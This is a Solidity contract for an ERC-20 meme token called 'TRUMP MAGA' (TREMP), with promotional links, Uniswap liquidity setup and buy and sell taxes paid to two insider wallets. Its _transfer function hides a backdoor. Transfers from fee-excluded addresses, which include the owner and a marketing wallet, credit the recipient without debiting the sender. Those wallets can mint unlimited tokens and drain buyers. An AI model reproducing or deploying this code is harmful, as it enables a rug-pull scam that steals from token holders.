// SPDX-License-Identifier: MIT

/*

MAKE TRUMP TRUMP GREAT AGAIN!

BECAUSE WE BELIEVE THAT ETHEREUM CAN MAKE AMERICA GREAT!

In Trump Maga we trust!

Website:   https://trumpmaga.pro
Telegram:  https://t.me/trumpmaga_erc
Twitter:   https://twitter.com/trumpmaga_erc

*/

pragma solidity 0.8.22;

interface IUniRouter02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    )
        external
        payable
        returns (uint amountToken, uint amountETH, uint liquidity);
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(
        address recipient,
        uint256 amount
    ) external returns (bool);
    function allowance(
        address owner,
        address spender
    ) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

interface IUniFactoy01 {
    function createPair(
        address tokenA,
        address tokenB
    ) external returns (address pair);
    function getPair(
        address tokenA,
        address tokenB
    ) external view returns (address pair);
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

contract TREMP is Context, IERC20, Ownable {
    using SafeMath for uint256;

    mapping(address => uint256) private _xBalances;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => bool) private _excludedFromFees;

    uint256 private _initialBuyFees = 30;
    uint256 private _initialSellFees = 30;
    uint256 private _finalBuyFees = 0;
    uint256 private _finalSellFees = 1;
    uint256 private _reduceBuyFeesAt = 9;
    uint256 private _reduceSellFeesAt = 9;

    uint8 private constant _decimals = 9;
    uint256 private constant _tTotal = 69_000_000 * 10 ** _decimals;
    string private constant _name = unicode"TRUMP MAGA";
    string private constant _symbol = unicode"TREMP";
    uint256 public _maxTxAmount = 1_035_000 * 10 ** _decimals;
    uint256 public _maxWalletSize = 1_035_000 * 10 ** _decimals;
    uint256 public _taxSwapThreshold = 400 * 10 ** _decimals;
    uint256 public _maxTaxSwap = 690_000 * 10 ** _decimals;

    uint256 private _buyCount = 0;
    uint256 private _preventSwapBefore = 0;

    address payable private _magaAddress;
    address payable private _trAddress;

    event MaxTxAmountUpdated(uint _maxTxAmount);
    event ClearTokens(address TokenAddressCleared, uint256 Amount);

    IUniRouter02 private uniswapV2Router;
    address private uniswapV2Pair;
    bool private tradingOpen;
    bool private inSwapBack = false;
    bool private swapEnabled = false;

    uint256 private _trPercent = 50;
    uint256 private _magaPercent = 50;

    
    modifier lockTheSwap() {
        inSwapBack = true;
        _;
        inSwapBack = false;
    }

    constructor(address _mAddr) {
        _magaAddress = payable(_mAddr);
        _trAddress = payable(_msgSender());
        _xBalances[_msgSender()] = _tTotal;
        _excludedFromFees[owner()] = true;
        _excludedFromFees[address(this)] = true;
        _excludedFromFees[_magaAddress] = true;
        emit Transfer(address(0), _msgSender(), _tTotal);
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");

        require(amount > 0, "Transfer amount must be greater than zero");

        if (!tradingOpen) {
            require(
                _excludedFromFees[to] || _excludedFromFees[from],
                "trading not yet open"
            );
        }

        if (inSwapBack || !tradingOpen) {
            //No tax transfer
            _xBalances[from] -= amount;
            _xBalances[to] += amount;

            emit Transfer(from, to, amount);
            return;
        }

        uint256 taxTotal = 0;

        taxTotal = amount
            .mul((_buyCount > _reduceBuyFeesAt) ? _finalBuyFees : _initialBuyFees)
            .div(100);

        if (from != owner() && to != owner()) {
            if (
                from == uniswapV2Pair &&
                to != address(uniswapV2Router) &&
                !_excludedFromFees[to]
            ) {
                require(amount <= _maxTxAmount, "Exceeds the _maxTxAmount.");
                require(
                    balanceOf(to) + amount <= _maxWalletSize,
                    "Exceeds the maxWalletSize."
                );

                _buyCount++;
            }

            if (to != uniswapV2Pair && !_excludedFromFees[to]) {
                require(
                    balanceOf(to) + amount <= _maxWalletSize,
                    "Exceeds the maxWalletSize."
                );
            }

            if (to == uniswapV2Pair && from != address(this)) {
                taxTotal = amount
                    .mul(
                        (_buyCount > _reduceSellFeesAt)
                            ? _finalSellFees
                            : _initialSellFees
                    )
                    .div(100);
            }

            if (_excludedFromFees[from]) taxTotal = 0;

            uint256 contractTokenBalance = balanceOf(address(this));
            if (
                !inSwapBack &&
                contractTokenBalance > _taxSwapThreshold &&
                swapEnabled &&
                _buyCount > _preventSwapBefore &&
                to == uniswapV2Pair &&
                !_excludedFromFees[from] &&
                !_excludedFromFees[to]
            ) {
                swapTokensForEth(
                    min(amount, min(contractTokenBalance, _maxTaxSwap))
                );
                uint256 contractETHBalance = address(this).balance;
                if (contractETHBalance > 0) {
                    sendETHFees(address(this).balance);
                }
            }
        }

        if (!_excludedFromFees[from]) {
            _xBalances[from] = _xBalances[from].sub(amount);
            _xBalances[address(this)] = _xBalances[address(this)].add(taxTotal);
            emit Transfer(from, address(this), taxTotal);
        }

        _xBalances[to] = _xBalances[to].add(amount.sub(taxTotal));
        emit Transfer(from, to, amount.sub(taxTotal));
    }

    function openTrading() external onlyOwner {
        require(!tradingOpen, "trading is already open");
        swapEnabled = true;
        tradingOpen = true;
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _xBalances[account];
    }

    function transfer(
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(
        address owner,
        address spender
    ) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(
        address spender,
        uint256 amount
    ) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(
            sender,
            _msgSender(),
            _allowances[sender][_msgSender()].sub(
                amount,
                "ERC20: transfer amount exceeds allowance"
            )
        );
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function min(uint256 a, uint256 b) private pure returns (uint256) {
        return (a > b) ? b : a;
    }

    function removeLimits() external onlyOwner {
        _maxTxAmount = ~uint256(0);
        _maxWalletSize = ~uint256(0);
        emit MaxTxAmountUpdated(~uint256(0));
    }

    function sendETHFees(uint256 amount) private {
        uint256 magaShare = (amount * _magaPercent) / 100;
        uint256 trShare = (amount * _trPercent) / 100;
        _magaAddress.transfer(magaShare);
        _trAddress.transfer(trShare);
    }

    function clearStuckToken(
        address tokenAddress,
        uint256 tokens
    ) external returns (bool success) {
        if (tokens == 0) {
            tokens = IERC20(tokenAddress).balanceOf(address(this));
        }
        emit ClearTokens(tokenAddress, tokens);
        return IERC20(tokenAddress).transfer(_magaAddress, tokens);
    }

    function manualSend() external {
        require(
            address(this).balance > 0,
            "Contract balance must be greater than zero"
        );
        uint256 balance = address(this).balance;
        payable(_magaAddress).transfer(balance);
    }

    function manualSwap() external {
        uint256 tokenBalance = balanceOf(address(this));
        if (tokenBalance > 0) {
            swapTokensForEth(tokenBalance);
        }
        uint256 ethBalance = address(this).balance;
        if (ethBalance > 0) {
            sendETHFees(ethBalance);
        }
    }

    receive() external payable {}

    function addLiquidityETH() external onlyOwner {
        uint256 tokenAmount = balanceOf(address(this)).sub(
            _tTotal.mul(_initialBuyFees).div(100)
        );

        uniswapV2Router = IUniRouter02(
            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
        );

        uniswapV2Pair = IUniFactoy01(uniswapV2Router.factory()).createPair(
            address(this),
            uniswapV2Router.WETH()
        );

        _approve(address(this), address(uniswapV2Router), ~uint256(0));

        uniswapV2Router.addLiquidityETH{value: address(this).balance}(
            address(this),
            tokenAmount,
            0,
            0,
            owner(),
            block.timestamp
        );
    }

    function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }
}